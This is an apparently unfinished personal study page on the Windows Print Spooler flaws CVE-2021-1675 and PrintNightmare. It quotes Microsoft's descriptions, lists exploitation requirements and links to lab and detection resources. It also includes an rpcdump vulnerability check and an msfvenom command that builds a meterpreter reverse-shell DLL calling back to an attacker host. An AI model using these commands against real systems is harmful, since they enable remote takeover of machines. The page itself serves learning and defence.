
# PrintNightmare


Microsoft described this vulnerability: *A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights".*

A Print Spooler Service is one of many [[Windows-Services]]. It is defined by Microsoft as: *"The [print spooler](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_c6bde257-38a5-43bb-8d0e-204e226b3655) service is a service that is running on each computer that participates in the Print Services system. The print spooler service implements the [print client](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_3b2da3d1-c159-4399-a6dd-dfd5f76fa2f5) and [print server](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_59fb3ddc-63cf-45df-8a90-46a6af9e00cb) roles, by enabling each participating system to act as a print client, administrative client, or print server for the Print Services system."*

[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) are related to each other, but differ regardless of being categorized as **Windows Print Spooler Remote Code Execution Vulnerability**.

As [Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "_is similar but distinct from the vulnerability that is assigned CVE-2021-1675._ _The attack vector is different as well."_

What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events. 

Per [Microsoft's](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) definition, PrintNightmare vulnerability is _"a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could **run arbitrary code** with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights."._

It is impactful and CVE Score of 8 for both, made more so by public PoC, Print Spooler is enabled by DEFAULT on DC with SYSTEM privileges and can be used over a network.

#### READ!!!

- Will be done in the next two weeks! Thank you for patience 

-   [PrintNightmare Network Analysis | JUMPSEC LABS](https://labs.jumpsec.com/printnightmare-network-analysis/)
-   [From Lares Labs: Detection & Remediation Information for CVE-2021-1675 & CVE-2021-34527](https://github.com/LaresLLC/CVE-2021-1675)
-   [PrintNightmare (CVE-2021-1675 and CVE 2021-34527) Explained](https://www.blumira.com/cve-2021-1675/)


#### Requirements

To exploit the CVE-2021-1675 vulnerability requires:
- Direct or local access to the machine to use a malicious DLL file to escalate privileges.
To exploit the CVE-2021-34527 vulnerability requires:
- Connection to remotely inject the malicious DLL file.

Tools like:
- [[Impacket-Cheatsheet]]
	- `smbserver` to host exploit 
	- `rpcdump @$ip | egrep 'MSPRN|MS-PAR'` to test if target `$ip` is vulnerable
- [THM version of CVE-2021-1675](https://github.com/tryhackme/CVE-2021-1675) and [THM version of Impacket](https://github.com/tryhackme/impacket.git) - here for compatibility and highlight some of my sources.
- Payload - Beacon or Reverse Shell
```ruby
# MSFvenom payload are commonly signatured by AV and EDR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
```




## References

[Print spooler Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_c6bde257-38a5-43bb-8d0e-204e226b3655)  
[Print client Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_3b2da3d1-c159-4399-a6dd-dfd5f76fa2f5) 
[Print server Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_59fb3ddc-63cf-45df-8a90-46a6af9e00cb) 
[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) 
[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
[Microsoft's PrintNightmare Definition](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) 
[Microsoft's description of CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) 
[THM PrintNight Room 1 - Learn the Vulberability](https://tryhackme.com/room/printnightmarehpzqlp8)
